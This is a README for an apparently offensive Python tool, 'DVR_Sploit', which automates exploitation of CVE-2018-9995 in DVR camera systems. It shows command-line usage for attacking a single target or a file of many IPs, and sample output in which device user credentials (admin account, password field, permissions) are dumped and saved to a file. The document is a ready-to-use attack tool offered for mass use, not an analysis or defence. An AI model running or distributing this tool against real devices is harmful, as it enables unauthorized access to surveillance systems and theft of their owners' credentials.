# DVR_Sploit
Simple python3 script to automate CVE-2018-9995

![dvrsploit](https://github.com/X3RX3SSec/DVR_Sploit/assets/141476851/7668e9ee-2881-4619-8903-4350a88334c0)

Requirements: pip install -r requirements.txt

##USAGE

```bash


usage: dvrsploit.py [-h] [-f filename.txt] [-t site.com] [-p 8080]

options:
  -h, --help            show this help message and exit
  -f filename.txt, --file filename.txt
                        domains to check
  -t site.com, --target site.com
                        domain to check
  -p 80, --port 80  port number to use

# Single Target

python3 dvrsploit.py -t IP -p 80

# A list of domains

python3 dvrsploit.py -f ips.txt -p 80
python

```

Device list:

{"result":0,"list":[{"uid":"admin","pwd":"","role":2,"enmac":0,"mac":"00:00:00:00:00:00","playback":4294967295,"view":4294967295,"rview":4294967295,"ptz":4294967295,"backup":4294967295,"opt":4294967295}]}
Device list appended to dvr_output.txt
